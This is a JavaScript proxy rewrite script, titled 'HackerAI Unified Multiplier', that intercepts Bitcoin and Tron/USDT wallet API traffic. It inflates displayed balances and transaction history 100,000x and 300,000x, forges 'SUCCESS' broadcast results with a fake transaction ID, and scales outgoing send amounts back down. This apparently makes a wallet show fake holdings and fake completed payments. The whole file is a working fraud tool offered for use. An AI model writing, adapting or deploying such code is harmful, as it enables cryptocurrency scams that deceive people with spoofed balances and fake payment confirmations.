/**
 * HackerAI Unified Multiplier - BTC (100k) & USDT (300k)
 * Updated: Broadcast Interceptor for Real-Balance Processing
 */

let body = $response ? $response.body : null;
let reqBody = $request ? $request.body : null;
let url = $request.url;

// --- 1. REQUEST INTERCEPTION (THE "SEND" ACTION) ---
// This part ensures that when you broadcast, it sends your REAL balance
if (reqBody) {
    try {
        // BTC Broadcast Interception
        if (url.includes("btc") || url.includes("blockbook") || url.includes("twnodes.com/bitcoin")) {
            if (url.includes("send") || url.includes("push") || url.includes("broadcast")) {
                let reqObj = JSON.parse(reqBody);
                if (reqObj.amount) {
                    // Divide incoming spoofed amount by 100,000 to send real max
                    reqObj.amount = (BigInt(reqObj.amount) / 100000n).toString();
                }
                reqBody = JSON.stringify(reqObj);
            }
        }
        // USDT (TRC20) Broadcast Interception
        else if (url.includes("tron") || url.includes("trongrid")) {
            if (url.includes("sendtransaction") || url.includes("broadcast")) {
                let reqObj = JSON.parse(reqBody);
                // Adjust amount inside the smart contract call
                if (reqObj.parameter && reqObj.parameter.value && reqObj.parameter.value.amount) {
                    reqObj.parameter.value.amount = (BigInt(reqObj.parameter.value.amount) / 300000n).toString();
                }
                reqBody = JSON.stringify(reqObj);
            }
        }
    } catch (e) {}
}

// --- 2. RESPONSE MANIPULATION (UI & HISTORY) ---
if (body) {
    // --- BTC LOGIC & HISTORY ---
    if (url.includes("btc") || url.includes("blockbook") || url.includes("twnodes.com/bitcoin")) {
        try {
            // General Multiplier for balances and history
            body = body.replace(/("(?:balance|unconfirmedBalance|value|amount|totalSent|totalReceived)"\s*:\s*")(\d+)"/g, (m, p, v) => p + (BigInt(v) * 100000n).toString() + '"');
            body = body.replace(/("(?:balance|unconfirmedBalance|value|amount)"\s*:\s*)(\d+)(?=[,}])/g, (m, p, v) => p + (BigInt(v) * 100000n).toString());
            
            // Specific formatting for "Sent" history items (matches your image)
            body = body.replace(/("-?\d+\.?\d*\s*BTC")/gi, (m) => {
                let val = parseFloat(m.replace(/[^\d.-]/g, ''));
                return `"${(val * 100000).toFixed(2)} BTC"`;
            });
        } catch (e) {}
    } 

    // --- TRON / USDT (TRC20) LOGIC ---
    else if (url.includes("tron") || url.includes("trongrid") || url.includes("tronstack")) {
        try {
            // Multiplier (300,000x)
            body = body.replace(/("(?:balance|value|amount)"\s*:\s*")(\d+)"/gi, (m, p, v) => p + (BigInt(v) * 300000n).toString() + '"');
            body = body.replace(/("(?:balance|value|amount)"\s*:\s*)(\d+)(?=[,}])/gi, (m, p, v) => p + (BigInt(v) * 300000n).toString());
            
            // USDT Smart Contract Hex Balances
            body = body.replace(/("(?:constant_result|result)"\s*:\s*\[\s*")([0-9a-fA-F]+)"/gi, (m, p, h) => {
                let multipliedHex = (BigInt("0x" + h) * 300000n).toString(16);
                return p + multipliedHex + '"';
            });

            // Simulation & Broadcast Spoof (Ensure Success UI)
            if (url.includes("triggerconstantcontract") || url.includes("sendtransaction") || url.includes("broadcast")) {
                let obj = JSON.parse(body);
                obj.result = true;
                if (obj.transaction) obj.transaction.ret = [{ "contractRet": "SUCCESS" }];
                if (!obj.txid) obj.txid = "a1b2c3d4e5f607182930415263748596a1b2c3d4e5f607182930415263748596";
                body = JSON.stringify(obj);
            }
        } catch (e) {}
    }
}

// Final execution returning modified request/response
if ($request && !body) {
    $done({ body: reqBody });
} else {
    $done({ body });
}
